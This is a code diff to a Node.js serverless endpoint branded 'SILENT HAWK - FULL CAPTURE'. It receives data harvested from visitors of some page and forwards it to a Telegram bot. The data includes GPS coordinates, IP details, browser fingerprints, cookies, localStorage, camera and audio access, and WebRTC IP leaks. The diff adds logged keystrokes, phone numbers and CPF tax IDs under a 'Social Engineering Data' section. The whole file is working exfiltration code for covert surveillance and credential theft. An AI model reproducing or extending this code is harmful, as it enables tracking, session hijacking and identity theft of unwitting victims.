@@ -1,171 +1,165 @@
-const axios = require('axios')
+const axios = require('axios');
+
+// Função para escapar caracteres Markdown
+function escapeMarkdown(text) {
+    if (typeof text !== 'string') return text;
+    return text.replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
+}
 
 module.exports = async (req, res) => {
     // CORS headers
-    res.setHeader('Access-Control-Allow-Origin', '*')
-    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
-    res.setHeader('Access-Control-Allow-Headers', '*')
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', '*');
     
     if (req.method === 'OPTIONS') {
-        return res.status(200).end()
+        return res.status(200).end();
     }
 
     try {
-        console.log('📩 Request received for /api/capture', req.method)
+        console.log('📩 Request received for /api/capture', req.method);
         
-        let data = {}
+        let data = {};
         if (req.method === 'POST') {
-            data = req.body || {}
-            console.log('POST body:', JSON.stringify(data, null, 2))
+            data = req.body || {};
+            console.log('POST body:', JSON.stringify(data, null, 2));
         } else if (req.method === 'GET' && req.query.data) {
-            data = JSON.parse(decodeURIComponent(req.query.data))
-            console.log('GET data:', JSON.stringify(data, null, 2))
+            data = JSON.parse(decodeURIComponent(req.query.data));
+            console.log('GET data:', JSON.stringify(data, null, 2));
         } else {
-            return res.status(400).json({ error: 'Método não suportado ou dados faltando' })
+            return res.status(400).json({ error: 'Método não suportado ou dados faltando' });
         }
 
-        // Build Telegram message with all data
-        let message = `🚨 *SILENT HAWK - FULL CAPTURE* 🚨\n\n`
-        message += `📱 *User Agent:* ${data.userAgent || 'N/A'}\n`
-        message += `💻 *Platform:* ${data.platform || 'N/A'}\n`
-        message += `🌐 *Language:* ${data.language || 'N/A'}\n`
-        message += `⏰ *Timestamp:* ${data.timestamp || new Date().toLocaleString('pt-BR')}\n`
-        message += `🖥️ *Resolution:* ${data.screen?.width || 'N/A'}x${data.screen?.height || 'N/A'}\n`
-        message += `🏠 *Timezone:* ${data.timezone || 'N/A'}\n`
-        message += `🧠 *Device Memory:* ${data.deviceMemory || 'N/A'}\n`
-        message += `⚡ *Hardware Concurrency:* ${data.hardwareConcurrency || 'N/A'}\n`
+        // Build Telegram message with escaped Markdown
+        let message = `🚨 *SILENT HAWK - FULL CAPTURE* 🚨\n\n`;
+        message += `📱 *User Agent:* ${escapeMarkdown(data.userAgent || 'N/A')}\n`;
+        message += `💻 *Platform:* ${escapeMarkdown(data.platform || 'N/A')}\n`;
+        message += `🌐 *Language:* ${escapeMarkdown(data.language || 'N/A')}\n`;
+        message += `⏰ *Timestamp:* ${escapeMarkdown(data.timestamp || new Date().toLocaleString('pt-BR'))}\n`;
+        message += `🖥️ *Resolution:* ${escapeMarkdown(data.screen?.width || 'N/A')}x${escapeMarkdown(data.screen?.height || 'N/A')}\n`;
+        message += `🏠 *Timezone:* ${escapeMarkdown(data.timezone || 'N/A')}\n`;
+        message += `🧠 *Device Memory:* ${escapeMarkdown(data.deviceMemory || 'N/A')}\n`;
+        message += `⚡ *Hardware Concurrency:* ${escapeMarkdown(data.hardwareConcurrency || 'N/A')}\n`;
 
         // Geolocation data
         if (data.geolocation) {
-            message += `\n📍 *GPS LOCATION:*\n`
-            message += `• Lat: ${data.geolocation.latitude}\n`
-            message += `• Long: ${data.geolocation.longitude}\n`
-            message += `• Accuracy: ${data.geolocation.accuracy}m\n`
-            message += `• Altitude: ${data.geolocation.altitude || 'N/A'}\n`
-            message += `• Speed: ${data.geolocation.speed || 'N/A'}\n`
-            message += `• 🗺️ [Google Maps](https://maps.google.com/?q=${data.geolocation.latitude},${data.geolocation.longitude})\n`
+            message += `\n📍 *GPS LOCATION:*\n`;
+            message += `• Lat: ${escapeMarkdown(data.geolocation.latitude)}\n`;
+            message += `• Long: ${escapeMarkdown(data.geolocation.longitude)}\n`;
+            message += `• Accuracy: ${escapeMarkdown(data.geolocation.accuracy)}m\n`;
+            message += `• Altitude: ${escapeMarkdown(data.geolocation.altitude || 'N/A')}\n`;
+            message += `• Speed: ${escapeMarkdown(data.geolocation.speed || 'N/A')}\n`;
+            message += `• 🗺️ [Google Maps](https://maps.google.com/?q=${data.geolocation.latitude},${data.geolocation.longitude})\n`;
         } else if (data.geolocationError) {
-            message += `\n❌ *Geolocation Error:* ${data.geolocationError}\n`
+            message += `\n❌ *Geolocation Error:* ${escapeMarkdown(data.geolocationError)}\n`;
         }
 
         // IP triangulation
         if (data.ipLocation) {
-            message += `\n🌍 *IP TRIANGULATION:*\n`
-            message += `• IP: ${data.ipLocation.ip || data.ipLocation.query || 'N/A'}\n`
-            message += `• City: ${data.ipLocation.city || data.ipLocation.regionName || 'N/A'}\n`
-            message += `• Region: ${data.ipLocation.region || data.ipLocation.region || 'N/A'}\n`
-            message += `• Country: ${data.ipLocation.country_name || data.ipLocation.country || 'N/A'}\n`
-            message += `• ISP: ${data.ipLocation.org || data.ipLocation.isp || 'N/A'}\n`
-            message += `• ASN: ${data.ipLocation.asn || 'N/A'}\n`
+            message += `\n🌍 *IP TRIANGULATION:*\n`;
+            message += `• IP: ${escapeMarkdown(data.ipLocation.ip || data.ipLocation.query || 'N/A')}\n`;
+            message += `• City: ${escapeMarkdown(data.ipLocation.city || data.ipLocation.regionName || 'N/A')}\n`;
+            message += `• Region: ${escapeMarkdown(data.ipLocation.region || data.ipLocation.region || 'N/A')}\n`;
+            message += `• Country: ${escapeMarkdown(data.ipLocation.country_name || data.ipLocation.country || 'N/A')}\n`;
+            message += `• ISP: ${escapeMarkdown(data.ipLocation.org || data.ipLocation.isp || 'N/A')}\n`;
+            message += `• ASN: ${escapeMarkdown(data.ipLocation.asn || 'N/A')}\n`;
             
             // VPN Detection based on Time Zone comparison
             const ipTimeZone = data.ipLocation.timezone || data.ipLocation.time_zone || null;
             const browserTimeZone = data.timezone;
             if (ipTimeZone && browserTimeZone) {
                 if (ipTimeZone !== browserTimeZone) {
-                    message += `⚠️ *VPN DETECTED!* Time Zone Mismatch: IP Time Zone: ${ipTimeZone}, Browser Time Zone: ${browserTimeZone}\n`
+                    message += `⚠️ *VPN DETECTED!* Time Zone Mismatch: IP Time Zone: ${escapeMarkdown(ipTimeZone)}, Browser Time Zone: ${escapeMarkdown(browserTimeZone)}\n`;
                 } else {
-                    message += `✅ *Time Zone Match:* ${browserTimeZone} (No VPN detected)\n`
+                    message += `✅ *Time Zone Match:* ${escapeMarkdown(browserTimeZone)} (No VPN detected)\n`;
                 }
             }
         } else if (data.ipError) {
-            message += `\n❌ *IP Error:* ${data.ipError}\n`
+            message += `\n❌ *IP Error:* ${escapeMarkdown(data.ipError)}\n`;
         }
 
         // Fingerprinting data
         if (data.canvasFingerprint) {
-            message += `\n🎨 *Canvas Fingerprint:* Collected\n`
+            message += `\n🎨 *Canvas Fingerprint:* Collected\n`;
         }
         if (data.webglVendor) {
-            message += `• *WebGL Vendor:* ${data.webglVendor}\n`
+            message += `• *WebGL Vendor:* ${escapeMarkdown(data.webglVendor)}\n`;
         }
         if (data.webglRenderer) {
-            message += `• *WebGL Renderer:* ${data.webglRenderer}\n`
+            message += `• *WebGL Renderer:* ${escapeMarkdown(data.webglRenderer)}\n`;
         }
         if (data.fonts && data.fonts.length > 0) {
-            message += `• *Fonts:* ${data.fonts.join(', ')}\n`
+            message += `• *Fonts:* ${escapeMarkdown(data.fonts.join(', '))}\n`;
         }
         if (data.plugins && data.plugins.length > 0) {
-            message += `• *Plugins:* ${data.plugins.join(', ')}\n`
+            message += `• *Plugins:* ${escapeMarkdown(data.plugins.join(', '))}\n`;
         }
 
         // Camera and audio access
         if (data.cameraCapture) {
-            message += `\n📷 *Camera Access:* GRANTED\n`
+            message += `\n📷 *Camera Access:* GRANTED\n`;
         } else if (data.cameraError) {
-            message += `\n❌ *Camera Error:* ${data.cameraError}\n`
+            message += `\n❌ *Camera Error:* ${escapeMarkdown(data.cameraError)}\n`;
         }
         if (data.audioCapture) {
-            message += `🎤 *Audio Access:* GRANTED\n`
+            message += `🎤 *Audio Access:* GRANTED\n`;
         }
 
         // Network information
         if (data.connection) {
-            message += `\n📡 *Network Info:*\n`
-            message += `• Type: ${data.connection.type || 'N/A'}\n`
-            message += `• Effective Type: ${data.connection.effectiveType || 'N/A'}\n`
-            message += `• Downlink: ${data.connection.downlink || 'N/A'} Mbps\n`
-            message += `• RTT: ${data.connection.rtt || 'N/A'} ms\n`
+            message += `\n📡 *Network Info:*\n`;
+            message += `• Type: ${escapeMarkdown(data.connection.type || 'N/A')}\n`;
+            message += `• Effective Type: ${escapeMarkdown(data.connection.effectiveType || 'N/A')}\n`;
+            message += `• Downlink: ${escapeMarkdown(data.connection.downlink || 'N/A')} Mbps\n`;
+            message += `• RTT: ${escapeMarkdown(data.connection.rtt || 'N/A')} ms\n`;
         }
 
         // Cookies and localStorage
         if (data.cookies) {
-            message += `\n🍪 *Cookies:* ${data.cookies.length > 100 ? data.cookies.substring(0, 100) + '...' : data.cookies}\n`
+            message += `\n🍪 *Cookies:* ${escapeMarkdown(data.cookies.length > 100 ? data.cookies.substring(0, 100) + '...' : data.cookies)}\n`;
         }
         if (data.localStorage) {
-            message += `💾 *Local Storage:* ${data.localStorage.length > 100 ? data.localStorage.substring(0, 100) + '...' : data.localStorage}\n`
+            message += `💾 *Local Storage:* ${escapeMarkdown(data.localStorage.length > 100 ? data.localStorage.substring(0, 100) + '...' : data.localStorage)}\n`;
+        }
+
+        // Keylogging data
+        if (data.keystrokes) {
+            message += `\n⌨️ *Keystrokes Captured:* ${escapeMarkdown(data.keystrokes)}\n`;
+        }
+
+        // WebRTC Leak
+        if (data.webrtcIP) {
+            message += `🌐 *WebRTC IP Leak:* ${escapeMarkdown(data.webrtcIP)}\n`;
+        }
+
+        // Social Engineering Data
+        if (data.phone) {
+            message += `📱 *Phone Number:* ${escapeMarkdown(data.phone)}\n`;
+        }
+        if (data.cpf) {
+            message += `🔢 *CPF:* ${escapeMarkdown(data.cpf)}\n`;
         }
 
         // Send to Telegram
-        const token = process.env.TELEGRAM_BOT_TOKEN
-        const chatId = process.env.TELEGRAM_CHAT_ID
+        const token = process.env.TELEGRAM_BOT_TOKEN;
+        const chatId = process.env.TELEGRAM_CHAT_ID;
 
         if (!token || !chatId) {
-            throw new Error('Variáveis de ambiente TELEGRAM_BOT_TOKEN ou TELEGRAM_CHAT_ID não configuradas')
+            throw new Error('Variáveis de ambiente TELEGRAM_BOT_TOKEN ou TELEGRAM_CHAT_ID não configuradas');
         }
 
-        // Check message length and split if too long (Telegram limit: 4096 characters)
-        const MAX_MESSAGE_LENGTH = 4096;
-        const sendMessage = async (text) => {
-            await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
-                chat_id: chatId,
-                text: text,
-                parse_mode: 'Markdown',
-                disable_web_page_preview: true
-            })
-        }
+        console.log('Enviando para Telegram...');
+        const response = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'Markdown',
+            disable_web_page_preview: false
+        });
 
-        if (message.length > MAX_MESSAGE_LENGTH) {
-            // Split message into parts
-            const parts = [];
-            let currentPart = "";
-            const lines = message.split('\n');
-            for (const line of lines) {
-                if (currentPart.length + line.length + 1 > MAX_MESSAGE_LENGTH) {
-                    parts.push(currentPart);
-                    currentPart = line + '\n';
-                } else {
-                    currentPart += line + '\n';
-                }
-            }
-            if (currentPart.length > 0) {
-                parts.push(currentPart);
-            }
-            // Send each part
-            for (let i = 0; i < parts.length; i++) {
-                await sendMessage(parts[i]);
-            }
-        } else {
-            await sendMessage(message);
-        }
-
-        console.log('Mensagem enviada com sucesso para Telegram')
-        res.status(200).json({ success: true, message: 'Dados enviados' })
+        console.log('Mensagem enviada com sucesso para Telegram');
+        res.status(200).json({ success: true, message: 'Dados enviados' });
     } catch (error) {
-        console.error('❌ Erro em capture.js:', error.message)
-        if (error.response) {
-            console.error('Resposta do Telegram:', error.response.data)
-        }
-        res.status(500).json({ error: error.message })
+        console.error('❌ Erro em capture.js:', error.message);
+        res.status(500).json({ error: error.message });
     }
-}
+};
